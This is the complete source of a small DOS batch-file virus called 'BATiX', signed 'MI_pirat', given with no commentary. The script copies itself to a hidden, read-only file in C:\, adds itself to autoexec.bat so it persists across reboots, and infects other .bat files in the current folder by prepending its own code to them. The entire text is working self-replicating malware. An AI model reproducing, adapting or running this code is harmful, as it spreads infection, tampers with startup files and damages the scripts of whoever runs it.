::<BATiX> by MI_pirat
if not exist C:\batix.bat goto make
:back 
for %%b in (*.bat) do set X=%%b
find /i "<BATiX>" %X%
if not errorlevel 1 goto bye
copy /a %0+%X% x.x
erase %X%
ren x.x %X%
goto bye
:make
copy %0 C:\batix.bat
attrib C:\batix.bat +h +r
echo BATiX >>C:\autoexec.bat
echo batix.bat>>C:\autoexec.bat
goto back
:bye
